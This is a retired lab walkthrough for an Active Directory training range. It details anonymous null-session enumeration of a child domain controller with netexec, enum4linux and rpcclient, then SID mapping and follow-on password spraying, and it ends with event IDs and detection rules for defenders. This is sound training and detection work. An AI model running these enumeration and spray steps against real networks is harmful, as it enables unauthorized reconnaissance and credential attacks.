# ~~WT#028 — Null Session Enumeration~~

> **❌ INVALID — Removed from active campaign.** Server 2025 `RestrictAnonymousSAM=1` blocks SAMR null binds even with `RestrictAnonymous=0`. No replacement. See [`CAMPAIGNS.md`](../Campaign/CAMPAIGNS.md) Phase 1 notes.

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc02 (192.168.77.11) |
| **Domain** | child.cadre.local |
| **Starting Credential** | None |
| **Tools Required** | enum4linux, rpcclient, netexec |
| **Certifications** | OSCP+ |
| **MITRE ATT&CK** | T1595 (Active Scanning), T1069 (Permission Groups Discovery) |
| **Difficulty** | Easy |

## Prerequisites
- dc02 has `RestrictAnonymous=0` (default CADRE config for child DC)
- Network access to 192.168.77.0/24
- Kali VM or Linux host with enum4linux / rpcclient installed

## Attack Steps

### 1. Verify null session via SMB

```bash
netexec smb 192.168.77.11 -u '' -p '' --users
```

Expect output showing the `RestrictAnonymous=0` allows anonymous enumeration of domain users.

### 2. Enumerate domain users with enum4linux

```bash
enum4linux -U 192.168.77.11
```

Output includes all user accounts in `child.cadre.local` with RIDs.

### 3. Enumerate groups and memberships

```bash
enum4linux -G 192.168.77.11
```

### 4. Manual enumeration with rpcclient

```bash
rpcclient -U "" -N 192.168.77.11
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querygroupmem 0x200
rpcclient $> lsaquery
```

### 5. SID mapping for lateral movement

```bash
netexec smb 192.168.77.11 -u '' -p '' --sid-to-user S-1-5-21-XXXX-XXXX-XXXX-500
```

Use the domain SID discovered in step 4's `lsaquery` output.

## Post-Exploitation Chain
```
Null Session Enumeration (WT#028)
  ├──> Password Spray (WT#031) — users.txt from null session
  ├──> RID brute force for additional accounts
  └──> SMB share enumeration (anonymous access)
```

## Telemetry Verification
**On dc02 (Event Logs):**
- **Event ID 4624** (Logon Type 3 — anonymous logon)
- **Event ID 4672** (Special Logon — ANONYMOUS LOGON)
- **Event ID 5156** (Windows Filtering Platform connection)

**Detection Rules:**
- `LogonAccount = "ANONYMOUS LOGON"` with LogonType 3
- SMB over TCP on port 445 from unknown IPs

## Status
**CONFIGURED** — dc02 has RestrictAnonymous=0, null sessions enumerate child.cadre.local users successfully.
